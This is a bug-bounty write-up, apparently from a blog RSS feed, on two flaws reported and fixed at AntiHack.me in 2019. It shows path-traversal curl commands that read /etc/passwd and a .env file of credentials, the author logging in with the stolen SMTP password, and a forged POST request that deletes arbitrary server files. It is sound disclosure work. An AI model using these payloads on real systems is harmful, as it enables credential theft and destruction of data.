+        <description>&lt;p&gt;AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creating an account, the user will be provided with information regarding the Bug Bounty Program found at AntiHack, and the AntiHack site itself is included in the program.&lt;/p&gt;
+
+&lt;h4 id=&quot;vulnerability-i-local-file-disclosure&quot;&gt;VULNERABILITY I (Local File Disclosure)&lt;/h4&gt;
+
+&lt;p&gt;When accessing the https://www.antihack.me/blog page, the website will display Popup Modal which contains an invitation to subscribe to AntiHack Magazine, which is an E-Zine made by them. The process is by entering some information in the field provided, then pressing the Submit button. After the Submit button is pressed, the user will be directed to the link to download the E-Zine. Following is the form of the link:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.antihack.me/filedownload.php?file=AntiHACKJan19Issue.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this structure, it can be seen that the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filedownload.php&lt;/code&gt; may have a Local File Disclosure vulnerability, where by using this file, we can download sensitive files that are on the server. I tried using curl like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@noobe.io ~]# curl https://www.antihack.me/filedownload.php?file=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It can be seen that the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filedownload.php&lt;/code&gt; really has a vulnerability so we can download files on the server. Because the AntiHack.me website uses Laravel, then I try to get the config file, which is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@noobe.io ~]# curl https://www.antihack.me/filedownload.php?file=../../../../var/www/html/.env
+
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=antihack
+DB_USERNAME=antihack
+DB_PASSWORD=
+
+MAIL_DRIVER=smtp
+MAIL_HOST=smtp.zoho.com
+MAIL_PORT=465
+MAIL_USERNAME=admin@antihack.me
+MAIL_PASSWORD=[ redacted ]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this information, I obtain sensitive information such as user and database passwords. There is even an SMTP user and password used. I tried logging in using the SMTP user and password obtained and it’s worked XD.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/c943919f00e9a4a7cd67a30b257c3ea1-1.png&quot; alt=&quot;AntiHack.Me Zoho Account&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;vulnerability-ii-idor-delete-any-file-on-antihackme-server&quot;&gt;VULNERABILITY II (IDOR Delete Any File on AntiHack.me Server)&lt;/h4&gt;
+
+&lt;p&gt;As on other Bug Bounty websites, there is a feature for reporting vulnerability found. There is also an attach file feature to add image or video files to complete the report that we send. After finishing uploading the file on the report form, an X button appears which serves to delete the file that was just uploaded, of course the function is to delete the file if we incorrectly upload the report file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/c943919f00e9a4a7cd67a30b257c3ea1-2.png&quot; alt=&quot;AntiHack.Me Delete File Button&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When the button is clicked, the process runs like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /php/ajax_remove_file.php HTTP/1.1
+Host: www.antihack.me
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.antihack.me/hacker_inbox
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 21
+Cookie: [ redacted ]
+Connection: close
+
+file=35C2XxQY_400x400.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Unfortunately there is no validation of any files that may be deleted. By manipulating the values of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; parameters we can delete any files contained on the AntiHack.me server.&lt;/p&gt;
+
+&lt;p&gt;For more details, please see the following GIF:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/c943919f00e9a4a7cd67a30b257c3ea1-3.gif&quot; alt=&quot;AntiHack.Me Delete File GIF&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In my trial I tried to delete files with several different extensions, but I did not try to delete files outside the website folder because I was worried that they might interfere and even damage the website.&lt;/p&gt;
+
+&lt;p&gt;Those are some of the vulnerabilities that were found on the Anti Hack.me website. Currently all of these vulnerabilities have been fixed by AntiHack.me.&lt;/p&gt;
+
+&lt;h4 id=&quot;timeline&quot;&gt;Timeline&lt;/h4&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2019-01-03: Bug reported
+2019-01-04: Triaged
+2019-01-06: Bug Fixed
+2019-01-09: Report Resolved
+2019-01-09: Swag Rewarded
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CWE-200 : Information Exposure&lt;/li&gt;
+  &lt;li&gt;CWE-284: Improper Access Control&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>2020-01-18</pubDate>
+        <link>http://localhost:4000/articles/2019-01/how-i-hack-antihack-me</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2019-01/how-i-hack-antihack-me</guid>
+        
+        <category>bug hunting</category>
+        
+        <category>hacking</category>
+        
+        <category>lfi</category>
+        
+        <category>lfd</category>
+        
+        
+        <category>bug hunting</category>
+        
+      </item>
+    
+  </channel>
+</rss>
